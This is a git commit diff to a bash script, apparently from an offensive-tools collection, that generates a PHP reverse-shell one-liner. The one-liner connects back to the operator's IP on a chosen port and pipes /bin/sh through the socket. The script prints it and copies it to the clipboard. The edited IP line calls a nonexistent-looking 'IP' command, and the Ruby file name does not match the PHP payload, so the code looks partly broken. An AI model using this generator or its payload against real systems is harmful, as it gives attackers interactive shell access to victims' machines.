66eacd077aa3e7f7c1ca1847027e3e72f0d1c384
neogeo56 <54796086+neogeo56@users.noreply.github.com>
2019-12-10 10:24:51 -0600

    Update ruby_rs.sh

--- Shells/ruby_rs.sh
+++ Shells/ruby_rs.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-IP=$( hostname -I );
+IP=$( IP );
 New_IP=$( echo -n $IP );
 echo "php -r '\$sock=fsockopen(\"$New_IP\",$1);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
 echo "php -r '\$sock=fsockopen(\"$New_IP\",$1);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | clip;
